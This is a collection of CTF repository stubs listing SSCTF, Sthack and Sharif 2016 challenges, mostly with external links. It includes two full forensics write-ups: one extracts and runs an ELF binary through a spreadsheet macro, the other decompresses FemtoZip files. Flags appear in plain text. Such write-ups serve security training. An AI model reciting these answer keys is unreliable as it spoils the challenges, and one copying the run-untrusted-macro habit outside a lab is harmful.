
* <https://github.com/teamavidya/ctf/tree/master/2016_ssctf_quals/can_you_hit_me%5Bweb200%5D>
# SSCTF 2016 : Flag-Man

**Category:** Web
**Points:** 400
**Solves:** 35
**Description:**

> Flag-Man
> 
> 该题目已有 35 个队伍完成
> 
> It has completed by 35 teams
> 
> 解题说明
> 
> Description
> 
> 
> Find The Flag Man
> 
> 战题链接<http://b525ac59.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Legend? Legend !

**Category:** Web
**Points:** 300
**Solves:** 34
**Description:**

> Legend？Legend！
> 
> 该题目已有 34 个队伍完成
> 
> It has completed by 34 teams
> 
> 解题说明
> 
> Description
> 
> 
> Legend! We make web a beautiful place.
> 
> 战题链接 <http://806bddce.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88691/?langid=1>
* [Spanish](https://blog.ka0labs.net/post/32/)
# SSCTF 2016 : Up!Up!Up!

**Category:** Web
**Points:** 100
**Solves:** 34
**Description:**

> Up!Up!Up!
> 
> 该题目已有 34 个队伍完成
> 
> It has completed by 34 teams
> 
> 解题说明
> 
> Description
> 
> 
> Please Upload
> 
> 本题目只有一个页面，且只有上传文件才能拿到Flag
> 
> 请不要进行扫描/爆破等操作
> 
> the challenge is one page, upload file only to get Flag
> 
> please don't scan/Brute server
> 
> 战题链接 <http://55e07875.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sthack 2016 : poke-naxtos

**Category:** Exploit
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://pony7.fr/ctf:public:sthack2016:pokenaxtos
# Sthack 2016 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [exploit/poke-naxtos](exploit/poke-naxtos)
* [system/see-you-on-the-other-side-4200](system/see-you-on-the-other-side-4200)

## Missing write-ups

* none yet
# Sthack 2016 : see-you-on-the-other-side-4200

**Category:** System
**Points:** 4200
**Solves:** 
**Description:**

Translated from french.

A member of the team rocket intercepted these frames from networks in Leo.
Find the teleporter code to access his secret garden.


## Write-up

(TODO)

## Other write-ups and resources

* https://securite.intrinsec.com/2016/04/13/write-up-sthack/
# Sharif University CTF 2016 : British Elevator

**Category:** Crypto
**Points:** 350
**Solves:** 21
**Description:**

> p = 16857450949524777441941817393974784044780411511252189319 
> 
> A = 16857450949524777441941817393974784044780411507861094535 
> 
> B = 77986137112576 
> 
> E: y^2 = x^3 + Ax + B over GF(p) 
> 
> P = (5732560139258194764535999929325388041568732716579308775, 14532336890195013837874850588152996214121327870156054248) 
> 
> Q = (2609506039090139098835068603396546214836589143940493046, 8637771092812212464887027788957801177574860926032421582) 
> 
> Q = secret * P 
> 
> flag = secret


## Write-up

(TODO)

## Other write-ups and resources

* [H4x0rPsch0rr](http://hxp.io/blog/25/)
* https://gist.github.com/elliptic-shiho/e76e7c2a2aff228d7807
# Sharif University CTF 2016 : Hail Zeus

**Category:** Crypto
**Points:** 300
**Solves:** 1
**Description:**

> Asking Hermes to gath'r intel on the foe, he recover'd the blueprint of their transmitt'r bef're getting captur'd. It’s been ov'r a month of radio silence. but wait... all hail Zeus, as they restart'd communication when he strok'd them with a lightning:
> 
> 11111010101010010101011010100011110101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010010110101111111100000111100101010111001010010111011100101111100001101000111111000101100110110011001111001001011101011011110110110101010000101101100001101010111101000010101000001100010111110000011111100100001000111111011010010010010100101011100011000000111001101010000001111111111010000111110001011001010110100001001100010111010101010000001111000011010101010101000011110000110101000111101000011010010010101111100101011111001111010001001101010000000010011000010110000011111000011001100011011001101011001111001001000110111100000101111000100100010100101000111101011011110010010011011110010001000001011101010001000000001100011001110011011100101100010001001001100100011111000011110000001100111011010000010100001100011000101010110010000010001000011100100101100001111100100001010101111010010111010010111100110110110111110100100101100011010000001000000000010000111010001010110111100100100110000100110011011110000010110001111000001111100100111000111011000101010001001111010011110010111000111100100000110000000110101110110001010000011010100001110100100111001110110101111011011111110000100010000101100011101000111100001000001001001100011001000000000100010111000100101101111100100111010000110101010111000010011000100101000101101010110101010010110001100110010110100010010100011011000010010101011100100101000001011001101101000011001010011110100110100000110111000010100010110010011110010010010100010111001111011000010100100111110001011010111011101010001010001101001110100100101001011010010001110110100011100011100000011011001100100100010011000110110000010100100011000111010001011110101001001101010000001110101000011100010110001000111101010000101011000001011101001101000001101000001100010001100100110100100101001010011100000111000011111110000110101101110001011010100001101000011000000110100101101000001011000110111001101001001100010011110010011100000110110100110100011111110101111000001001000011010010001111001011001100101000101111000001101010001100010001100000011000100100101101111110100111011101101101001011000101010010011100010010110010100110011111100000000100001010000000111001010010001111010000001100000001000101001111011101010001111100111101100010110100111100000111011001110100010000010001010110100001100111001001101001001010001011101000011010000011100000001010110101100001011010000110010010101000001111010101111101000101011111011000011100001110000011110000011110110111100000011100000100100000111011001110010010010001010011000011010000010001001001000001001011010011010011101000010111010010111010001100001011000011010010010110101011000000010010100010111001011101101111010101111000010101000011111000001000110111110101101101011001010011111000101101001011001000110100101011001001111101110010000010101000011000000110101000111001000101010001111110011110100010010100010011000010110000111010101101000101011101000001000010100000001101010110111000100100000100100000011011010111001010110011001110100111110100001001101100011001011010111001110110110010110101000100100110100101111110001010110010000011110010111010011000110110100001101000000110010011110100110110010011000100111110100001001001110010011111000100001000011100010111100001110101000111010001011101001001000000000000001101100110010000100101000001100000111010000011000010010000010010100110000000001000000000000001101110000000000011100000000001100101000000011111011000000001010001000000000110010000000000010011000000010001000000000011010010000000001011010000000010000...
> 
> Download [Blueprint.pdf](./Blueprint.pdf)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/crypto_300_zeus>
# Sharif University CTF 2016 : High-speed RSA Keygen

**Category:** Crypto
**Points:** 150
**Solves:** 25
**Description:**

> See the attached files.
> 
> Download [RSA-Keygen.tar.gz](./RSA-Keygen.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](https://github.com/tyhan/CTF/tree/master/SharifCTF2016/High-speed_RSA_Keygen)
* https://gist.github.com/elliptic-shiho/4e3d6bac91a032cc6f20
# Sharif University CTF 2016 : Huge

**Category:** Crypto
**Points:** 250
**Solves:** 19
**Description:**

> Bigger, Not Better
> 
> Download [huge.tar.gz](./huge.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* https://gist.github.com/elliptic-shiho/4d94141acf5054af90f6
# Sharif University CTF 2016 : Rail Fence Cipher

**Category:** Crypto
**Points:** 50
**Solves:** 319
**Description:**

> Decrypt and find the flag.
> 
> Download [Ciphertext](./Ciphertext)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/SharifCTF/Cryp1>
* <https://www.youtube.com/watch?v=am-psraHQYw&feature=youtu.be>
* <https://0x90r00t.com/2016/02/06/sharif-university-ctf-2016-crypto-50-rail-fence-cipher-write-up/>
* <http://cafelinux.info/articles/writeups-sharifctf-2016-rail-fence-cipher-crypto-50#ENG>
* <http://err0r-451.ru/sharifctf-crypto-railfencecipher-50pts/>
# Sharif University CTF 2016 : Smooth As Silk

**Category:** Crypto
**Points:** 200
**Solves:** 11
**Description:**

> p > q 
> 
> n = p*q = 11461532818525251775869994369956628325437478510485272730419843320517940601808597552925629451795611990372651568770181872282590309894187815091191649914833274805419432525386234876477307472337026966745408507004000948112191973777090407558162018558945596691322909404307420094584606103206490426551745910268138393804043641876816598599064856358266650339178617149833032309379858059729179857419751093138295863034844253827963
> 
> flag = md5(str(p))


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.cnblogs.com/Christmas/p/5185512.html>
* <https://github.com/BatmansKitchen/ctf-writeups/tree/master/2016-sharifctf>
# Sharif University CTF 2016 : The Russian Attack

**Category:** Crypto
**Points:** 500
**Solves:** 4
**Description:**

> See the attached file
> 
> Download [russian-attack.tar.gz](./russian-attack.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University CTF 2016 : URE

**Category:** Crypto
**Points:** 100
**Solves:** 70
**Description:**

> Universal ReEncryption <http://ctf.sharif.edu:34455/chal/URE/720a20f3bea9892f/>


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/06/sharif-university-ctf-2016-crypto-100-rail-fence-cipher-write-up/>
* [Korean](https://github.com/tyhan/CTF/tree/master/SharifCTF2016/URE)
# Sharif University CTF 2016 : Blocks

**Category:** Forensics
**Points:** 400
**Solves:** 28
**Description:**

> I recovered as much data as I could. Can you recover the flag?
>
> Download [data3](./data3)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-forensics-blocks-arturo182/>
* <http://losfuzzys.github.io/writeup/2016/02/07/sharifctf2016-blocks/>
* <https://ctf.rip/sharifctf-2016-blocks-forensics-400-point-challenge/>
* <https://0x90r00t.com/2016/02/08/sharif-university-ctf-2016-forensic-400-blocks-write-up/>
# Sharif University CTF 2016 : Dumped!

**Category:** Forensics
**Points:** 100
**Solves:** 275
**Description:**

> In Windows Task Manager, I right clicked a process and selected "Create dump file". I'll give you the dump, but in return, give me the flag!
> 
> Download [RunMe.DMP.xz](./RunMe.DMP.xz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-forensics-dumped-arturo182/>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/SharifCTF/For2-dumped>
* <https://www.youtube.com/watch?v=wTMLQZwDcVs&feature=youtu.be>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-forensic-100-dumped-write-up/>
# Sharif University CTF 2016 : Kick Tort Teen

**Category:** Forensics
**Points:** 50
**Solves:** 120
**Description:**

> Anagram, anyone?
> 
> Download [data.xls](./data.xls)


## Write-up

by [jashanbhoora](https://github.com/jashanbhoora)

Upon opening the Excel file we are given, we are presented with a 23x14747 spreadsheet of integers.
I notice the Excel warning that Macros have been disabled, so I open the Macro Editor (Alt + F11) and find the following macro.

```VBA
Function FileExists(ByVal FileToTest As String) As Boolean
   FileExists = (Dir(FileToTest) <> "")
End Function
Sub DeleteFile(ByVal FileToDelete As String)
   If FileExists(FileToDelete) Then 'See above
      SetAttr FileToDelete, vbNormal
      Kill FileToDelete
   End If
End Sub
Sub DoIt()
    Dim filename As String
    filename = Environ("USERPROFILE") & "\fileXYZ.data"
    DeleteFile (filename)
    
    Open filename For Binary Lock Read Write As #2
    For i = 1 To 14747
        For j = 1 To 23
            Put #2, , CByte((Cells(i, j).Value - 78) / 3)
        Next
    Next
    
    Put #2, , CByte(98)
    Put #2, , CByte(13)
    Put #2, , CByte(0)
    Put #2, , CByte(73)
    Put #2, , CByte(19)
    Put #2, , CByte(0)
    Put #2, , CByte(94)
    Put #2, , CByte(188)
    Put #2, , CByte(0)
    Put #2, , CByte(0)
    Put #2, , CByte(0)
    
    Close #2
End Sub
```

I haven't done any VBA, but I figure it's writing a file to the Windows environment variable `%USERPROFILE%`.
I enable and run the macro, and upon checking `%USERPROFILE%` I find `fileXYZ.data`

Analysing under Ubuntu:

```
file fileXYZ.data 
fileXYZ.data: ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, stripped

chmod +x fileXYZ.data 
./fileXYZ.data 
SharifCTF{5bd74def27ce149fe1b63f2aa92331ab}
```
And there's the flag!

<b>Flag: SharifCTF{5bd74def27ce149fe1b63f2aa92331ab}</b>

## Other write-ups and resources

* <https://github.com/ctfs/write-ups-2016/tree/master/su-ctf-2016/forensics/kick-tort-teen-50>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-forensic-50-kick-tort-teen-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/for_50_tort#eng-version>
* <https://github.com/QuokkaLight/write-ups/blob/master/sharif-university-ctf-2016/forensics/Kick_Tort_Teen.md>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/SHARIFCTF/forensics/kick_tort_teen>
# Sharif University CTF 2016 : Memdump

**Category:** Forensics
**Points:** 400
**Solves:** 33
**Description:**

> We we trying to capture the flag too! But that’s what it left for us. 
> 
> 
> NOTE: file changed. the md5 of new file (memdum.xz): 
> 
> 5226ba338e9e889a2122eaea9d4980e6
> 
> Download [memdump2.xz](https://mega.nz/#!PEMnDDhR)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-02-06-su-ctf/memdump-400>
* <http://ctfwriteups.blogspot.in/2016/02/sharif-ctf-2016-memdump-forensics-400.html>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-forensic-400-memdump-write-up/>
# Sharif University CTF 2016 : Network Forensics

**Category:** Forensics
**Points:** 200
**Solves:** 64
**Description:**

> You are given a cap file that contains wireless traffics in a location. Find the flag! :-)
> 
> Download [Net_Forensic.cap](./Net_Forensic.cap)


## Write-up

(TODO)

## Other write-ups and resources

* <http://opcode.ninja/sharif-ctf-2016-network-forensics/#header>
* <https://pwningmad.wordpress.com/2016/02/06/sharifctf-network-forensics-task-writeup/>
# Sharif University CTF 2016 : uagent

**Category:** Forensics
**Points:** 100
**Solves:** 84
**Description:**

> We think we are really cool, are we?
> 
> Download [ragent.pcap](./ragent.pcap)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-forensics-uagent-arturo182/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/for_100_uagent>
* <https://github.com/tuvshuud/1up/blob/master/SharifCTF2016/uagent100/README.md>
# Sharif University CTF 2016 : We lost the Fashion Flag!

**Category:** Forensics
**Points:** 100
**Solves:** 132
**Description:**

> In Sharif CTF we have lots of task ready to use, so we stored their data about author or creation date and other related information in some files. But one of our staff used a method to store data efficiently and left the group some days ago. So if you want the flag for this task, you have to find it yourself!
> 
> Download [fashion.tar.gz](./fashion.tar.gz)


## Write-up

by [jashanbhoora](https://github.com/jashanbhoora)

We are given a single file for the challenge: `fashion.tar.gz`

```
file fashion.tar.gz
fashion.tar.gz: gzip compressed data, from Unix, last modified: Thu Feb  4 18:22:33 2016
```

Seems to be pretty standard, so I decompress it (`tar xvzf fashion.tar.gz`), yielding another archive called `sharif_tasks.tgz` and a file called `fashion.model`

```
file sharif_tasks.tgz
sharif_tasks.tgz: gzip compressed data, from Unix, last modified: Mon Dec 21 09:19:30 2015
```

```
file fashion.model
fashion.model: data
```

I decided to look at the `fashion.model` file first. Opening it in `ghex`, it seems to contain hundreds of JSON style entries, and some random bytes filling the end of the file. The most useful part is the header of the file, which mentions "FemtoZip". A quick search for femtozip leads me to a [Github Repository](https://github.com/gtoubassi/femtozip "FemtoZip Github Repository"), that explains that FemtoZip is "a 'shared dictionary' compression library optimized for small documents that may not compress well with traditional tools such as gzip."

Assuming that I would need it later, I installed it and moved on to the tgz.
Decompressing the tgz (`tar xvzf sharif_task.tgz`) yields a single folder `out` with 12,431 files in it, numbered sequentially. Each is around 20-30 bytes in size and contains nothing resembling a flag.

Guessing that the files may each have been compressed with FemtoZip, I started reading the FemtoZip Wiki to see how you decompress its output.
On the third point on the tutorial, I find the command to decompress a folder of files using a model. We seem to have both parts, so I attempt the same command.

```
./fzip --model fashion.model --decompress out/
```

Success! Each file in `out` decompressed into a text file containing a single JSON object with 7 attributes:

e.g. file `0`
{'category': 'pwn', 'author': 'staff_3', 'challenge': 'Fashion', 'flag': 'SharifCTF{c6790c36aab123a82323865ef149afd4}', 'ctf': 'Shairf CTF', 'points': 55, 'year': 2013}

e.g. file `18`
{'category': 'forensic', 'author': 'staff_5', 'challenge': 'Fashion', 'flag': 'SharifCTF{15fea9e049540c22a9fac943c1f84d17}', 'ctf': 'Shairf CTF', 'points': 135, 'year': 2012}

Considering the brief of the challenge, these files should be make up a "catalogue" for the flags used in each Sharif CTF. Therefore, I figured that if we could narrow down the JSON objects to one that was applicable to this challenge, we would find the correct flag.

I used a series of quick and dirty greps to do this. First, take all the files and copy their string into one file, one per line:

```
nl out/* > all.txt
```

then wittle down the entries using a different attribute each time...

```
cat all.txt | grep "forensic" | grep "Fashion" | grep ": 2016" | grep ": 100" > final.txt

cat final.txt

1316    {'category': 'forensic', 'author': 'staff_3', 'challenge': 'Fashion', 'flag': 'SharifCTF{2b9cb0a67a536ff9f455de0bd729cf57}', 'ctf': 'Shairf CTF', 'points': 100, 'year': 2016}
1364  {'category': 'forensic', 'author': 'staff_5', 'challenge': 'Fashion', 'flag': 'SharifCTF{41160e78ad2413765021729165991b54}', 'ctf': 'Shairf CTF', 'points': 100, 'year': 2016}
2124  {'category': 'forensic', 'author': 'staff_2', 'challenge': 'Fashion', 'flag': 'SharifCTF{8725330d5ffde9a7f452662365a042be}', 'ctf': 'Shairf CTF', 'points': 100, 'year': 2016}
4356  {'category': 'forensic', 'author': 'staff_3', 'challenge': 'Fashion', 'flag': 'SharifCTF{1bc898076c940784eb329d9cd1082a6d}', 'ctf': 'Shairf CTF', 'points': 100, 'year': 2016}
11769  {'category': 'forensic', 'author': 'staff_6', 'challenge': 'Fashion', 'flag': 'SharifCTF{c19285fd5d56c13b169857d863a1b437}', 'ctf': 'Shairf CTF', 'points': 100, 'year': 2016}
```

Great! Just 5 potential flags from 12,431! I set about attempting to submit them, and found first one to be the answer!

Fun bit of detective work!

Flag: SharifCTF{2b9cb0a67a536ff9f455de0bd729cf57}

## Other write-ups and resources

* <https://github.com/gtoubassi/femtozip>
* <https://www.xil.se/post/sharifctf-2016-forensics-fashion-flag-arturo182/>
* <https://github.com/ctfs/write-ups-2016/tree/master/su-ctf-2016/forensics/we-lost-the-fashion-flag-100>
* <https://0x90r00t.com/2016/02/09/sharif-university-ctf-2016-forensic-100-we-lost-the-fashion-flag-write-up/>
# Sharif University CTF 2016 : Asian Cheetah

**Category:** Misc
**Points:** 50
**Solves:** 198
**Description:**

> We have hidden a message in png file using jar file. Flag is hidden message. Flag is in this format: 
> 
> SharifCTF{flag}
> 
> Download [cheetah.tar.gz](./cheetah.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-misc-50-asian-cheetah-write-up/>
* <https://opcode.ninja/sharif-university-ctf-2016-asian-cheetah/#header>
* <http://www.codehead.co.uk/sharifctf-2016-asian-cheetah-misc-50-points/>
* <https://www.youtube.com/watch?v=_O_tbiHF7Qg>
* <http://err0r-451.ru/sharifctf-misc-asian-cheetah-50pts/>
* [Russian](http://countersite.org/articles/steganography/59-asiancheetah.html)
# Sharif University CTF 2016 : Hack By The Sound

**Category:** Misc
**Points:** 200
**Solves:** 16
**Description:**

> A well known blogger has came to a hotel that we had good relationships with its staffs. We tried to capture the sound of his room by placing a microphone inside the desk. 
> 
> We have recorded the sound about the time that he has typed a text in his blogg. You could find the text he typed in "Blog Text.txt". 
> 
> We reduce noises somehow and found that many characters may have the same keysound. Also we know that he use meaningful username and password. 
> 
> Could you extract the username and password of his blog? 
> 
> flag is concatenation of his username and password as usernamepassword.
> 
> Download [sound.tar.gz](./sound.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-misc-sound-rspkt/>
# Sharif University CTF 2016 : Impossible Game

**Category:** Misc
**Points:** 300
**Solves:** 8
**Description:**

> Imposible Game <http://ctf.sharif.edu:38455/chal/img/ImpossibleGame.html>
> 
> Download [server.py](./server.py)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/misc_300_impossible>
* <https://gist.github.com/zku/d8869cbef6e7c1f614c7>
# Sharif University CTF 2016 : Sec-Coding 1

**Category:** Misc
**Points:** 100
**Solves:** 172
**Description:**

> You should fix vulnerabilities of the given source code, WITHOUT changing its normal behaviour. Link <http://ctf.sharif.edu:39455/chal/sec/problem.php?problem=ctf6_seccoding1>


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/06/sharif-university-ctf-2016-misc-100-sec-coding-1-write-up/>
* <http://losfuzzys.github.io/writeup/2016/02/07/sharifctf2016-sec-coding1/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/misc_100_seccoding1>
# Sharif University CTF 2016 : Sec-Coding 2

**Category:** Misc
**Points:** 300
**Solves:** 82
**Description:**

> You should fix vulnerabilities of the given source code, WITHOUT changing its normal behaviour. [Link](http://ctf.sharif.edu:39455/chal/sec/problem.php?problem=ctf6_seccoding2)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-misc-secure2/>
* <https://0x90r00t.com/2016/02/06/sharif-university-ctf-2016-misc-300-sec-coding-2-write-up/>
* <http://losfuzzys.github.io/writeup/2016/02/07/sharifctf2016-sec-coding2/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/misc_300_seccoding2>
# Sharif University CTF 2016 : ECHO

**Category:** Pwn
**Points:** 200
**Solves:** 4
**Description:**

> Do you have an echo server? You can test its quality Here <http://ctf.sharif.edu:37455/echo-test.cgi>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University CTF 2016 : Kiuar

**Category:** Pwn
**Points:** 200
**Solves:** 19
**Description:**

> telnet ctf.sharif.edu 12432


## Write-up

(TODO)

## Other write-ups and resources

* <http://opcode.ninja/sharif-ctf-2016-kiuar-pwn-200/>
* <http://losfuzzys.github.io/writeup/2016/02/09/sharifctf2016-kiuar/>
* <https://gist.github.com/djekmani/c749b35c20320f1bd37e>
# Sharif University CTF 2016 : Login to System

**Category:** Pwn
**Points:** 200
**Solves:** 106
**Description:**

> Can you login to this system without username and password?
>
> telnet ctf.sharif.edu 27515
>
> Download [Question.zip](./Question.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-pwn-login/>
* <http://losfuzzys.github.io/writeup/2016/02/07/sharifctf2016-Login-to-system/>
* <http://www.cnblogs.com/Christmas/p/5184665.html>
* <http://opcode.ninja/sharif-ctf-2016-login-to-system-pwn-200/#header>
# Sharif University CTF 2016 : SQL

**Category:** Pwn
**Points:** 150
**Solves:** 67
**Description:**

> Our website <http://ctf.sharif.edu:36455/chal/sql/> executes your PostgreSQL queries. And flags are nicely formatted.


## Write-up

(TODO)

## Other write-ups and resources

* <http://losfuzzys.github.io/writeup/2016/02/07/sharifctf2016-sql/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/pwn_150_sql>
* <https://ctf.rip/sharifctf-sql-150-point-pwn-challenge/>
* <https://gist.github.com/djekmani/7ab77f261f1a4034d4d3>
* <https://github.com/QuokkaLight/write-ups/blob/master/sharif-university-ctf-2016/pwn/SQL.md>
# Sharif University CTF 2016 write-ups

* <http://ctf.sharif.edu/2016/>
* [Scoreboard](http://ctf.sharif.edu/2016/panel/scoreboard/) or [local alternative](scoreboard)

## Completed write-ups

* [forensics/kick-tort-teen-50](forensics/kick-tort-teen-50)
* [forensics/we-lost-the-fashion-flag-100](forensics/we-lost-the-fashion-flag-100)

## External write-ups only

* [crypto/british-elevator-350](crypto/british-elevator-350)
* [crypto/hail-zeus-300](crypto/hail-zeus-300)
* [crypto/high-speed-rsa-keygen-150](crypto/high-speed-rsa-keygen-150)
* [crypto/huge-250](crypto/huge-250)
* [crypto/rail-fence-cipher-50](crypto/rail-fence-cipher-50)
* [crypto/smooth-as-silk-200](crypto/smooth-as-silk-200)
* [crypto/ure-100](crypto/ure-100)
* [forensics/blocks-400](forensics/blocks-400)
* [forensics/dumped-100](forensics/dumped-100)
* [forensics/memdump-400](forensics/memdump-400)
* [forensics/network-forensics-200](forensics/network-forensics-200)
* [forensics/uagent-100](forensics/uagent-100)
* [misc/asian-cheetah-50](misc/asian-cheetah-50)
* [misc/hack-by-the-sound-200](misc/hack-by-the-sound-200)
* [misc/impossible-game-300](misc/impossible-game-300)
* [misc/sec-coding-1-100](misc/sec-coding-1-100)
* [misc/sec-coding-2-300](misc/sec-coding-2-300)
* [pwn/kiuar-200](pwn/kiuar-200)
* [pwn/login-to-system-200](pwn/login-to-system-200)
* [pwn/sql-150](pwn/sql-150)
* [reverse/android-app-100](reverse/android-app-100)
* [reverse/dmd-50](reverse/dmd-50)
* [reverse/interpolation-200](reverse/interpolation-200)
* [reverse/serial-150](reverse/serial-150)
* [reverse/srm-50](reverse/srm-50)
* [reverse/maze-400](reverse/maze-400)
* [web/hackme-400](web/hackme-400)
* [web/oldpersian-250](web/oldpersian-250)
* [web/photoblog-100](web/photoblog-100)
* [web/technews-200](web/technews-200)

## Missing write-ups

* [crypto/the-russian-attack-500](crypto/the-russian-attack-500)
* [pwn/echo-200](pwn/echo-200)
* [reverse/hi-200](reverse/hi-200)
* [reverse/wincc-300](reverse/wincc-300)
# Sharif University CTF 2016 : Android App

**Category:** Reverse
**Points:** 100
**Solves:** 58
**Description:**

> Find the Flag!!
> 
> Download [Sharif_CTF.apk](./Sharif_CTF.apk)


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-reverse-100-android-app-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/re_100_android>
* <http://vulnerablespace.blogspot.co.uk/2016/02/ctf-writeup-sharif-university-ctf-2016_82.html>
* <http://grazfather.github.io/ctf/re/2016/02/14/Sharif-CTF-RE100-Android-App-Writeup.html>
* [Chinese](http://www.cnblogs.com/Christmas/p/5184563.html)
# Sharif University CTF 2016 : dMd

**Category:** Reverse
**Points:** 50
**Solves:** 243
**Description:**

> Flag is : The valid input
> 
> Download [dMd](./dMd)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-re-dmd-kbeckmann/>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-reverse-50-dmd-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/re_50_dmd>
* <http://www.codehead.co.uk/sharifctf-2016-dmd-reverse-engineering-50points/>
# Sharif University CTF 2016 : HI

**Category:** Reverse
**Points:** 200
**Solves:** 3
**Description:**

> The Program is registerd for following system specification: 
> 
> 
> Processor type: Intel Itanium-based 
> 
> Number of processors: 64 
> 
> Physical RAM => 128GB 
> 
> OS version: 12.2 Build 1200 
> 
> 
> run and capture the flag!
> 
> Download [HI2.exe](./HI2.exe)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/1amtom/writeups/tree/master/2016-02-06-SharifCTF/re-200-HI>
# Sharif University CTF 2016 : Interpolation

**Category:** Reverse
**Points:** 200
**Solves:** 20
**Description:**

> NEWTON is an autonomous unmanned aerial vehicle (UAV). Where the UAV is refueled at t=180 ? 
> 
> 
> Path planning: 
> 
> t	x	y	
> 
> 0;	35.645592;	50.951123; 
> 
> 20;	35.144068;	50.467725; 
> 
> 40;	34.729775;	48.204541; 
> 
> 60;	34.204433;	46.117139; 
> 
> 80;	33.602623;	44.908643; 
> 
> 100;	33.162285;	42.337842; 
> 
> 120;	33.712359;	40.140576; 
> 
> 140;	33.931410;	38.580518; 
> 
> 150;	33.894940;	37.745557; 
> 
> 170;	33.474422;	36.273389; 
> 
> 190;	35.32583531;	35.663648; 
> 
> 210;	33.130089;	35.19047214; 
> 
> 220;	32.409544;	35.141797; 
> 
> 230;	32.085525;	34.786115; 
> 
> 
> The flag is: [the bridge`s name near the refule place]_[Latitude of the place with 5 digits after the decimal point]_[Longitude of the place with 5 digits after the decimal point]


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-02-06-su-ctf/re-interpolation-200>
# Sharif University CTF 2016 : Maze

**Category:** Reverse
**Points:** 400
**Solves:** 2
**Description:**

> Play the game and capture the flag!
> 
> Download [Maze3.exe](./Maze3.exe)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/1amtom/writeups/tree/master/2016-02-06-SharifCTF/re-400-maze> 
# Sharif University CTF 2016 : Serial

**Category:** Reverse
**Points:** 150
**Solves:** 108
**Description:**

> Run and capture the flag!
> 
> Download [serial](./serial)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-re6-serial/>
* <https://bannsecurity.com/index.php/home/10-ctf-writeups/29-sharif-university-ctf-2016-serial>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-reverse-150-serial-write-up/>
* <http://grazfather.github.io/ctf/re/2016/02/07/Sharif-CTF-RE150-Serial-Writeup.html>
# Sharif University CTF 2016 : SRM

**Category:** Reverse
**Points:** 50
**Solves:** 173
**Description:**

> The flag is : The valid serial number
> 
> Download [RM.exe](./RM.exe)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/sharifctf-2016-re-srm-kbeckmann/>
* <https://0x90r00t.com/2016/02/07/sharif-university-ctf-2016-reverse-50-srm-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/re_50_srm>
* <http://vulnerablespace.blogspot.co.uk/2016/02/ctf-writeup-sharif-university-ctf-2016_7.html>
* <http://www.codehead.co.uk/sharifctf-2016-srm-reverse-engineering-50-points/>
# Sharif University CTF 2016 : WinCC

**Category:** Reverse
**Points:** 300
**Solves:** 4
**Description:**

> Run it and capture the flag!
> 
> Download [WinCC.exe](WinCC3.exe)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University CTF 2016 : hackme

**Category:** Web
**Points:** 400
**Solves:** 48
**Description:**

> Hack me, please <http://ctf.sharif.edu:35455/chal/hackme/2aad034d9247f8e1/login.php>


## Write-up

